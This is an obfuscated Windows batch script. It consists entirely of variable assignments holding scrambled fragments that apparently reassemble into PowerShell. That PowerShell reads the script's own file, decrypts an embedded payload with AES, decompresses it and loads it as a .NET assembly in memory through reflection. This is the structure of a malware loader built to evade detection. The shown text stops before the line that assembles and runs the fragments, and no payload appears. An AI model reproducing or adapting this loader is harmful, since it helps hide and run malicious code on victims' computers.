@echo off
set "XkYFVGyMhd=gnir"
set "UDOWWqyPvH=File"
set "ZzLTmPLKdx=zHhH"
set "pFgosPfDjf='0Pg"
set "WdiZncesuu=bjec"
set "rFfXKkzOdM=PxEW"
set "BrztdmFNAa=em.C"
set "leCsKNBwUe=ose("
set "HGZhpfrbGD=join"
set "gaLbWRuHBd=ing("
set "dRwCdIgZjo=saBm"
set "GTZFYIYbaJ=hk.T"
set "tRVhKhdPXT=s75K"
set "XybSRTeEii='')("
set "kFyPICSUOi=16] "
set "zVUjTXmvmO=$XhG"
set "ZYisiGjilL=iron"
set "YeOoAHYZLZ=, (,"
set "BhZczYPwkt=('%~f0'"
set "wrjMtWuLmZ=.-16"
set "GPlOpOGqjz=yHhU"
set "RFWJKMoKok=gMod"
set "shjVntKaUA=ispo"
set "etiPPtGDrK=m.IO"
set "GoouPAPpHe=oin "
set "ZNvRYdFzpf=, $I"
set "yVjDqYMQTB= = N"
set "XVMUvwVGyP=cj ="
set "KCbhUZLHYr=[-1."
set "wdQqHLYeqV=Invo"
set "vqPsjaBBXS=X, 0"
set "sMDlzONQmC=ss -"
set "nyxRYAkDvO=();$"
set "gLlsqNlHsV=.Dis"
set "DLytCmDiiM=LWMX"
set "kJtKrbDBKP=g = "
set "MSLnpAPqSR=form"
set "RZQdprvBpi=New-"
set "sBhyGxwkbg=ateD"
set "rJNFVjDFoN='[-1"
set "udWGVelInr== $P"
set "aeukIjVqfU= New"
set "qkmVydJkDc=; };"
set "uIffJxNNnZ=X = "
set "JXrsFCBURo=ptog"
set "JnHrSMwORv=Fina"
set "JkgwiTTghv=NSct"
set "SNiTIkTTXv=ress"
set "lamtdyRMoy=null"
set "nFIYWCGuvX=stem"
set "FvtQdUNrSh=X = "
set "yhYHkTpHYk=TllA"
set "UpyESdIaoS=tsWi"
set "jfCrHGqybw=);$b"
set "crcclSUBTl=yHhU"
set "UnPkCgUSGv=am;$"
set "wKWxASUACp=ypto"
set "NRnqIRTGMj=nirt"
set "IElfdMkkZm=tg, "
set "TicIollZJx='[-1"
set "pWdKQsvaTB=cj.T"
set "YXciUYUgrD=.Ass"
set "PauHKeZmpC=t Sy"
set "wsslRBLalw=Ghk."
set "myxnCHoAsy=CFxo"
set "EoUVSbgwgS=::De"
set "GjWSiNZpqE=VODm"
set "UmQSWVmnWX=[]] "
set "UslULwKmGJ=-4] "
set "SccKIEAdQF=..-1"
set "FDBwfMANRu=U.Pa"
set "pJtkhlqiWy= '')"
set "PJPBTLSNYl=x.Su"
set "lDOcLaANVp=Vc ="
set "uGVkBFlQYs=$xXP"
set "bhCrdGwhhS=Obje"
set "gkjXokEWSJ=n ''"
set "MryCZirBMf=yTo("
set "VoSGXxCfAQ=.Key"
set "TuvyLAaHXE=urit"
set "VucRiUrUJY=PKCS"
set "TbBvpYuaFJ=-ep "
set "bklyKNBIQh=gjYA"
set "ffNjIprWRZ=rofi"
set "jUqRRsVkMC=ert]"
set "QDxysgVDYR=onve"
set "oTsBuxBPFH=LWMX"
set "wQKvmZzrNf=MX);"
set "PDiSoCxLoq=raph"
set "zuXWuIoDyz=in $"
set "FKfdXJfrgk=Stre"
set "BJzIunCaHa=flec"
set "KcTQehZSBR=]::("
set "VMrjqwBbVb=lBlo"
set "hAwFmnaGam=Ghk "
set "lUXazQbckP=sion"
set "dnCqpthtFW=oint"
set "NnEvSPbJtM=);$G"
set "kvGkYWkQed=Secu"
set "gfeibmTEGd=eMVs"
set "CntxJtihLb===')"
set "AfhekiiRso=raph"
set "LaLDAbhabZ=106u"
set "PhmGRmdsdU=:: '"
set "gywqFEMOhd= = $"
set "fFNmulHKxT=ddin"
set "SOZdJnwaWi=ctg."
set "kzcDnnqtZY=Comp"
set "vreepZAvHc=Syst"
set "nDMJtdEGOo=-joi"
set "ifSPEcQygY=rity"
set "ZFHYAOGhRZ=y.Pa"
set "qzKNanmvux=pStr"
set "VqriPurJmr=and "
set "GYzfwidZlP= [st"
set "tAHiOgKCFM=.Mem"
set "qNRwMfgBYH= [Sy"
set "fuoVUEiXHx=-Obj"
set "VkWyWmcysf=Disp"
set "CaytVerjBC=ode]"
set "rvSbnEPEUH=1..-"
set "EQgNvrTMDt=pres"
set "jFvQbQvdEr=yIE."
set "ZysGLrnPfT=-joi"
set "CZwRVrmfoN=hy.A"
set "GAfImnGJrN=nage"
set "OIZwSOusMb=join"
set "QlttrCfOhi=bstr"
set "nXZarJyVwh=O.Me"
set "vrtfcEtFnr=daeR"
set "RduSnReHNe=rans"
set "ZFMsTFLbbi=m(, "
set "aQadhxexOq=rtS4"
set "MoHyvlCgwo=ewLi"
set "syNPGzXAqS=ptor"
set "rqAUsxzaDD=Dmx "
